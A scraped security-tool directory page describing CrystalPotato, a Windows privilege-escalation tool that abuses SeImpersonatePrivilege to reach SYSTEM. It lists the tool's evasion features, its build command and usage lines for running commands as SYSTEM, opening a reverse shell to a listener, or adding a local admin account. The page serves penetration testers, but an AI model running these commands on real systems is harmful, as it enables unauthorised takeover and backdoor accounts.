@@ -1,0 +1,128 @@
+---
+title: CrystalPotato
+url: https://kitploit.com/en/tools/github/ricardojoserf/crystalpotato
+source: Kitploit
+date: 2026-08-24
+fetch_date: 2026-08-25T02:59:05.579027
+---
+
+# CrystalPotato
+
+[Skip to content](#main-content)
+
+[![Kitploit](/_next/image?url=%2Flogo.png&w=64&q=75)KITPLOIT](/en)[Tools](/en/tools)[Blog](/en/blog)Categories
+
+EN
+
+[Submit](/en/submit)
+
+[Tools](/en/tools)[Blog](/en/blog)Categories
+
+[Submit](/en/submit)
+
+EN
+
+Hacking, PenTest, and Cybersecurity Tools for Your Security Arsenal!
+
+Kitploit is a directory of hacking, cybersecurity, and pentesting tools. Discover the latest project updates to find vulnerabilities, analyze systems, automate testing, and strengthen your security.
+
+·Analytics preferences·[Feeds](/en/feeds)·[Contact](/en/contact)·[Privacy](/en/privacy)·© 2026 Kitploit
+
+Tool Directory
+
+## Categories
+
+[View all categories](/en/categories)
+
+Loading categories
+
+CrystalPotato — Crystal port of GodPotato to abuse SeImpersonatePrivilege with indirect syscalls, dynamic API resolution and compile-time string obfuscation. Run commands, reverse shells or add users | Kitploit
+
+[Tools](/en/tools)/![GitHub](/providers/github.png)GitHub/ricardojoserf/crystalpotato
+
+![](https://assets.kitploit.com/production/public/tools/51070/31725b40b372473bac24c0d2f284cba9fc07a88bb8b26321e88ffa99ee3fd7c9-display-v1.webp)
+
+[Privilege Escalation](/en/categories/privilege-escalation)[Exploitation](/en/categories/exploitation)[Post-Exploitation](/en/categories/post-exploitation)[Penetration Testing](/en/categories/penetration-testing)[Red Teaming](/en/categories/red-teaming)[Adversarial Attack](/en/categories/adversarial-attack)
+
+![GitHub](/providers/github.png)ricardojoserf/crystalpotato
+
+# CrystalPotato
+
+Crystal port of GodPotato to abuse SeImpersonatePrivilege with indirect syscalls, dynamic API resolution and compile-time string obfuscation. Run commands, reverse shells or add users
+
+[View Repository](https://github.com/ricardojoserf/crystalpotato)
+
+82 days ago![Not yet reviewed](/_next/image?url=%2Fbadges%2Fkitploit_badge_not_reviewed_full.png&w=48&q=75)
+
+### Most Popular
+
+[View all →](/en/tools)
+
+Discover the most used tools by our community.
+
+Last 7 DaysLast 30 Days
+
+Explore all tools
+
+Browse our collection of tools
+
+[View all tools →](/en/tools)
+
+Share
+
+[Website](https://ricardojoserf.github.io/crystalpotato/)
+
+# CrystalPotato
+
+Crystal port of GodPotato, a local privilege escalation from accounts with `SeImpersonatePrivilege` to SYSTEM. It works by abusing the DCOM OXID Resolver and named pipe impersonation.
+
+Windows APIs are resolved dynamically and invoked through indirect syscall stubs, all strings are XOR-obfuscated at compile time and by default only the command output is printed. Tested on Windows 10, 11 and Server 2025.
+
+![CrystalPotato](https://assets.kitploit.com/production/public/readmes/51070/0af583db30178b4ff48f4644618c048dabe7f5c3fe0f387f872e66c4a319a33b/0b344ff7be9f5c430247e7beb8fedef1d3eb3813e7565516eddc2089f93886a3-display-v1.webp)
+
+## Build
+
+CrystalPotato compiles to a single file with no dependencies using [Crystal on Windows](https://crystal-lang.org/install/on_windows/):
+
+root@kitploit:~
+
+```
+crystal build CrystalPotato.cr -o CrystalPotato.exe --release --static
+```
+
+## Usage
+
+Execute a command, start a reverse shell, or create a local admin.
+
+root@kitploit:~
+
+```
+CrystalPotato.exe -c <COMMAND>
+CrystalPotato.exe -H <LHOST> -P <LPORT> [-c <SHELL>]
+CrystalPotato.exe -u <USER> -pw <PASS>
+```
+
+![img2](https://assets.kitploit.com/production/public/readmes/51070/31725b40b372473bac24c0d2f284cba9fc07a88bb8b26321e88ffa99ee3fd7c9/425062c7be09afb2cab206f27de6454812eae689159ccb5a06105ea8fdefbd21-display-v1.webp)
+
+## Sources
+
+* [GodPotato](https://github.com/BeichenDream/GodPotato) - Original C# implementation by [BeichenDream](https://github.com/BeichenDream).
+* [RustPotato](https://github.com/safedv/RustPotato) - Rust implementation by [safedv](https://github.com/safedv).
+* [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato) - C# implementation with extra functionalities by [tylerdotrar](https://github.com/tylerdotrar).
+
+[Download Tool](https://github.com/ricardojoserf/crystalpotato)
+
+| Flag | Description |
+| --- | --- |
+
+|  |  |
+| --- | --- |
+| `-c CMD` | Command to execute as SYSTEM or shell for reverse shell (default: `cmd.exe`) |
+| `-H HOST` | Reverse shell listener Host |
+| `-P PORT` | Reverse shell listener Port |
+| `-u USER` | Create local admin - Username |
+| `-pw PASS` | Create local admin - Password |
+| `-p NAME` | Custom pipe name (default: `Crystal`) |
+| `-d` | Debug output |
+| `-dd` | Full trace |
+| `-h` | Show help |
